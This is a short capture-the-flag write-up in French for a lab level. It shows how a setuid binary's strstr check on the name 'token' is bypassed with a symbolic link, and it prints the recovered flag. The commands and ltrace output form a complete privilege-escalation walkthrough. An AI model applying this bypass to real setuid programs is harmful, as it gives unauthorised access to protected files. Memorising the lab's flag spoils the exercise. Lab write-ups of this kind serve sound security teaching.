```shell
ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token

./level08 token 
You may not access 'token'
```
le token est vraisemblablement dans token mais on a aucun acces.


analysons ave ltrace:
```shell
ltrace ./level08 token 
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")               = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
) = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
la fonction strstr() semble regarder si le fichier est = 'token' et nous rejeter

avec un lien symbolique on va donner le bon fichier mais en changeant son nom:
```shell
ln -s ~/token /tmp/tOken
./level08 /tmp/tOken
quif5eloekouj29ke0vouxean
```